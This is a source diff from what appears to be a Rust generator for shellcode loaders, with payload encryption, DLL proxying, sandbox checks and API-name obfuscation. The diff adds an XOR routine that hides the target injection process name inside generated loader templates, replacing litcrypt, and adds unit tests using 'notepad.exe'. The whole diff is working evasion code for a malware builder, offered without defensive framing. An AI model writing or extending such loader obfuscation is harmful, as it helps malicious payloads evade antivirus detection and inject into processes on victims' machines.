@@ -3,9 +3,7 @@ use crate::arg_parser::{Encryption, Execution, Format, Order};
 use crate::dll_proxy;
 use crate::pe_parser;
 use crate::sandbox::build_sandbox;
-use crate::tools::{
-    litcrypt_string_expr, random_aes_iv, random_aes_key, random_u8, EncryptionOutput,
-};
+use crate::tools::{random_aes_iv, random_aes_key, random_u8, EncryptionOutput};
 use crate::uuid_enc::encrypt_uuid;
 use crate::xor::encrypt_xor;
 use fs_extra::dir::{copy, CopyOptions};
@@ -29,7 +27,7 @@ fn obfuscate_api_name(name: &str, key: u8) -> String {
     format!("[{}]", bytes.join(", "))
 }
 
-/// Generate a non-zero random key for API obfuscation
+/// Generate a random non-zero key for API obfuscation
 fn non_zero_random_key() -> u8 {
     loop {
         let k = random_u8();
@@ -183,6 +181,37 @@ fn build_encrypted_output(order: &Order, src_dir: &Path) -> (EncryptionOutput, S
     (output, include_path)
 }
 
+/// Obfuscate a string for use in template code
+///
+/// # Arguments
+/// * `value` - The string to obfuscate
+///
+/// # Returns
+/// Obfuscated string expression
+fn obfuscate_string_for_template(value: &str) -> String {
+    // Use XOR obfuscation for all strings in templates
+    let (obfuscated, key) = crate::string_obfuscation::xor_obfuscate(value);
+    let bytes_lit: Vec<String> = obfuscated.iter().map(|b| format!("0x{:02x}", b)).collect();
+
+    // Generate a unique variable name based on the string
+    let var_name = format!("s_{}", generate_string_hash(value));
+
+    // Return the deobfuscation code
+    format!(
+        "let {} = [{}]\n    .iter()\n    .map(|b| *b ^ 0x{:02x})\n    .map(|b| b as char)\n    .collect::<String>();",
+        var_name, bytes_lit.join(", "), key
+    )
+}
+
+/// Generate a simple hash for string variable naming
+fn generate_string_hash(s: &str) -> u32 {
+    let mut hash: u32 = 5381;
+    for c in s.bytes() {
+        hash = hash.wrapping_mul(33).wrapping_add(c as u32);
+    }
+    hash % 10000 // Keep it reasonable
+}
+
 /// Build all replacements for the template
 ///
 /// # Arguments
@@ -204,10 +233,13 @@ fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, St
     replacements.insert("{{LITCRYPT_SETUP}}", LITCRYPT_SETUP.to_string());
     replacements.insert("{{DLL_MAIN}}", String::new());
     replacements.insert("{{DLL_FORMAT}}", String::new());
+
+    // Obfuscate target process name
     replacements.insert(
         "{{TARGET_PROCESS}}",
-        litcrypt_string_expr(&order.target_process),
+        obfuscate_string_for_template(&order.target_process),
     );
+
     replacements.insert("{{SANDBOX}}", String::new());
     replacements.insert("{{SANDBOX_IMPORTS}}", String::new());
 
@@ -488,5 +520,28 @@ mod tests {
         let insert_at = proxy_module_insert_offset(source);
         assert!(source[..insert_at].contains("use_litcrypt!();"));
         assert!(source[insert_at..].starts_with('\n'));
+    }
+
+    #[test]
+    fn test_generate_string_hash() {
+        let hash1 = generate_string_hash("test");
+        let hash2 = generate_string_hash("test");
+        assert_eq!(hash1, hash2); // Same input = same hash
+
+        let hash3 = generate_string_hash("different");
+        // Different input should (probably) have different hash
+        // Note: This could theoretically fail due to hash collision, but extremely unlikely
+        assert_ne!(
+            hash1, hash3,
+            "Hash collision detected for test vs different"
+        );
+    }
+
+    #[test]
+    fn test_obfuscate_string_for_template() {
+        let obfuscated = obfuscate_string_for_template("notepad.exe");
+        assert!(obfuscated.contains("let s_"));
+        assert!(obfuscated.contains(".iter()"));
+        assert!(obfuscated.contains("^ 0x"));
     }
 }
